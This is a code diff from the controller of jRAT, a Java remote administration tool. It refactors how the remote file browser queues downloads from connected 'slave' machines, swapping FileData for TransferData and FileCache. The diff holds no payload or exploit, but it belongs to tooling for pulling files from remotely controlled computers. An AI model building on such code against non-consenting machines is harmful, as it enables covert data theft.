@@ -46,7 +46,6 @@ import javax.swing.event.PopupMenuListener;
 import javax.swing.table.DefaultTableModel;
 
 import se.jrat.client.Drive;
-import se.jrat.client.FileData;
 import se.jrat.client.Main;
 import se.jrat.client.SendFile;
 import se.jrat.client.Slave;
@@ -65,6 +64,8 @@ import se.jrat.client.ui.components.DefaultJTable;
 import se.jrat.client.ui.renderers.table.FileViewTableRenderer;
 import se.jrat.client.utils.IconUtils;
 import se.jrat.client.utils.Utils;
+import se.jrat.common.io.FileCache;
+import se.jrat.common.io.TransferData;
 import se.jrat.common.utils.DataUnits;
 
 import com.redpois0n.oslib.OperatingSystem;
@@ -933,14 +934,15 @@ public class FrameRemoteFiles extends BaseFrame {
 				FrameFileTransfer frame = new FrameFileTransfer();
 				frame.setVisible(true);
 
-				FileData data = new FileData(slave);
-				data.setLocalFile(f.getSelectedFile());
-
+				TransferData data = new TransferData();
+				data.local = f.getSelectedFile();
+				FileCache.put(slave, data);
+	
 				slave.addToSendQueue(new Packet21ServerDownloadFile(file));
 				for (int i = 1; i < rows.length; i++) {
 					int row = rows[i];
 					if (model.getValueAt(row, 1).toString().length() > 0) {
-						data.getRemoteFiles().add(model.getValueAt(row, 0).toString());
+						//data.getRemoteFiles().add(model.getValueAt(row, 0).toString());
 						frame.load(model.getValueAt(row, 0).toString());
 					}
 				}
@@ -957,8 +959,9 @@ public class FrameRemoteFiles extends BaseFrame {
 				frame.setVisible(true);
 
 				if (model.getValueAt(row, 1).toString().length() > 0) {
-					FileData data = new FileData(slave);
-					data.setLocalFile(f.getSelectedFile());
+					TransferData data = new TransferData();
+					data.local = f.getSelectedFile();
+					FileCache.put(slave, data);
 					slave.addToSendQueue(new Packet21ServerDownloadFile(file));
 				}
 			}
